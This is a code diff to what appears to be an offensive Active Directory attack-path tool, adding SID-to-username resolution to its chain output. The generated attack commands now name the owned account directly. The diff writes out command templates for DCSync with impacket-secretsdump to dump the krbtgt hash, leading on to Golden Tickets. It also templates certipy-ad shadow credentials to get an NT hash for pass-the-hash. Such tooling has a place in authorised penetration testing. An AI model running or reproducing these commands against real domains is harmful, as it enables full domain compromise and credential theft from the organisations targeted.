@@ -693,6 +693,11 @@ def run(report, store, ui=None):
             if key in seen:
                 continue
             seen.add(key)
+            # iter-39: resolve principal SID -> username so summaries name
+            # the ACTOR instead of showing S-1-5-21-...-1105.
+            _psid = edge.get("principal", "") or ""
+            _pname = store.resolve_sid(_psid) or ""
+            actor = f"{_pname}" if _pname else _psid or "<owned-user>"
             # iter-37: DCSync rights - direct DCSync without needing to
             # gain admin first. Highest-value ACL-edge chain because it
             # yields krbtgt (which then enables R-GOLDEN at score 15).
@@ -706,23 +711,29 @@ def run(report, store, ui=None):
                     continue
                 seen.add(dcsync_key)
                 _dom_ds = store.dominant_domain() or "<DOM>"
+                # iter-39: use resolved principal name in owned-user slot
+                # when known, so the operator can paste directly.
+                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-DCSYNC", "direct DCSync via ACL",
-                    f"DCSync rights on {tgt} (principal has GetChanges + "
+                    f"DCSync rights: {actor} on {tgt} (GetChanges + "
                     f"GetChangesAll)",
                     crit=10, conf=0.9, ready=1.5, prox=1.0,        # score 13.5
                     commands=[
-                        f"# principal SID: {edge.get('principal', '<see BloodHound>')}",
+                        (f"# principal (SID {_psid})" if not _pname else
+                         f"# principal resolved -> '{_pname}'"),
                         f"impacket-secretsdump -just-dc-user krbtgt "
-                        f"'{_dom_ds}/<owned-user>:<password>'@<DC-IP>",
+                        f"'{_dom_ds}/{_owned}:<password>'@<DC-IP>",
                         f"# with krbtgt hash, next: R-GOLDEN chain",
                     ], src=edge["src"], line=edge["line"]))
                 continue
             if r == "AddKeyCredentialLink":
+                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-SHADOW", "shadow credentials",
-                    f"AddKeyCredentialLink on {tgt} (Shadow Creds -> PKINIT -> NT hash)",
+                    f"AddKeyCredentialLink: {actor} -> {tgt} "
+                    f"(Shadow Creds -> PKINIT -> NT hash)",
                     crit=9, conf=0.85, ready=1.4, prox=0.9,         # score 9.64
                     commands=[
-                        f"certipy-ad shadow auto -u '<owned-user>@<dom>' "
+                        f"certipy-ad shadow auto -u '{_owned}@<dom>' "
                         f"-p '<password>' -account '{tgt}' -dc-ip <DC>",
                         f"# certipy prints {tgt}'s NT hash; PtH (see R7)",
                     ], src=edge["src"], line=edge["line"]))
